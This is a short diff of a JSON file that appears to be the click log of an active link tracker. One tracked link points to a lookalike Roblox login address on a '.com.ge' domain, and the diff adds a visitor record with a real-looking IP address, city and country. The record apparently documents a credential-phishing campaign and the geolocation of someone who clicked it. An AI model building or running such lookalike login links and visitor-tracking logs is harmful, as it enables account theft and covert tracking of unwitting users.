@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1339,
+    "useCount": 1340,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10880,6 +10880,14 @@
         "city": "Wrexham",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777411858128,
+        "ip": "187.56.85.195",
+        "country": "Brazil",
+        "city": "Suzano",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
